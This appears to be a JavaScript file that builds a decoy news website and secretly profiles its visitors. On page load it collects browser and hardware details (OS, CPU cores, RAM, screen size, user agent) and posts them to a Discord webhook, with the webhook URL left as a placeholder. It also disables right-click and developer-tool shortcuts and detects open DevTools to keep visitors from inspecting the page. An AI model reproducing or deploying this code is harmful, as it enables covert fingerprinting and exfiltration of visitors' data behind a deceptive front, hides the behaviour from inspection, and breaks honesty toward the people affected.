// SECURITY LAYER - LOAD FIRST
(function(){
    // Block all inspection methods
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', e => {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C','U'].includes(e.key))) {
            e.preventDefault();
            document.getElementById('sec-warn').style.display = 'flex';
            setTimeout(() => document.getElementById('sec-warn').style.display = 'none', 3000);
        }
    });
    
    // Detect DevTools opening
    const devtools = /./;
    devtools.toString = function(){
        document.getElementById('sec-warn').style.display = 'flex';
        setTimeout(() => document.getElementById('sec-warn').style.display = 'none', 3000);
        return '';
    };
    console.log('%c', devtools);
    
    // Load CSS dynamically
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = 'style.css';
    document.head.appendChild(link);
    
    // Inject HTML Content
    const html = `
    <header>
        <div class="container">
            <h1>Daily News Network</h1>
            <p>Your trusted source for the latest updates</p>
        </div>
    </header>
    <nav>
        <div class="container">
            <ul>
                <li><a href="#">Home</a></li>
                <li><a href="#">World</a></li>
                <li><a href="#">Politics</a></li>
                <li><a href="#">Business</a></li>
                <li><a href="#">Technology</a></li>
                <li><a href="#">Sports</a></li>
            </ul>
        </div>
    </nav>
    <div class="container">
        <div class="main-content">
            <main class="articles">
                <article>
                    <h2>Global Summit Addresses Climate Change Concerns</h2>
                    <p>World leaders gathered today to discuss urgent measures against climate change.</p>
                    <a href="#" class="read-more">Read More</a>
                </article>
                <article>
                    <h2>Tech Giant Unveils Revolutionary Smartphone</h2>
                    <p>The latest smartphone features groundbreaking battery technology.</p>
                    <a href="#" class="read-more">Read More</a>
                </article>
                <article>
                    <h2>Stock Markets Reach Record Highs</h2>
                    <p>Global markets surged today as investor confidence grows.</p>
                    <a href="#" class="read-more">Read More</a>
                </article>
            </main>
            <aside class="sidebar">
                <div class="sidebar-widget">
                    <h3>Subscribe to Newsletter</h3>
                    <form>
                        <input type="email" placeholder="Your email address">
                        <button type="submit">Subscribe</button>
                    </form>
                </div>
                <div class="sidebar-widget">
                    <h3>Trending Now</h3>
                    <ul>
                        <li><a href="#">Celebrity Wedding</a></li>
                        <li><a href="#">Health Benefits of Coffee</a></li>
                        <li><a href="#">Rare Artifact Found</a></li>
                    </ul>
                </div>
            </aside>
        </div>
    </div>
    <footer>
        <div class="container">
            <p>&copy; 2023 Daily News Network. All rights reserved.</p>
        </div>
    </footer>
    `;
    document.getElementById('app').innerHTML = html;

    // Start scanning functionality
    startScanning();
})();

// SCANNING FUNCTIONALITY
function startScanning() {
    const DISCORD_WEBHOOK = "YOUR_WEBHOOK_URL";
    let scanData = {};
    
    function getOSInfo() {
        const ua = navigator.userAgent;
        let os = "Windows", version = "10";
        if (/Windows NT 10.0; Win64; x64/.test(ua)) {
            const edgeVer = ua.match(/Edg\/(\d+)/);
            if (edgeVer && edgeVer[1] >= 94) version = "11";
            if (/Windows 11/.test(ua)) version = "11";
        }
        return {os, version};
    }

    function getCPUInfo() {
        const cores = navigator.hardwareConcurrency || 1;
        let actualCores = cores;
        if (cores === 4 && navigator.deviceMemory <= 4) {
            actualCores = 2;
        }
        return {logicalCores: cores, physicalCores: actualCores};
    }

    function collectSystemInfo() {
        const os = getOSInfo();
        const cpu = getCPUInfo();
        
        scanData = {
            os: `${os.os} ${os.version}`,
            cpu: `${cpu.physicalCores} cores (${cpu.logicalCores} threads)`,
            ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Unknown",
            screen: `${screen.width}x${screen.height}`,
            browser: navigator.userAgent
        };
        
        sendToDiscord(scanData);
    }

    function sendToDiscord(data) {
        const embed = {
            title: "System Scan Results",
            fields: [
                {name: "OS", value: data.os},
                {name: "CPU", value: data.cpu},
                {name: "RAM", value: data.ram},
                {name: "Screen", value: data.screen},
                {name: "Browser", value: `\`\`\`${data.browser}\`\`\``}
            ]
        };
        
        fetch(DISCORD_WEBHOOK, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({embeds: [embed]})
        });
    }

    collectSystemInfo();
}
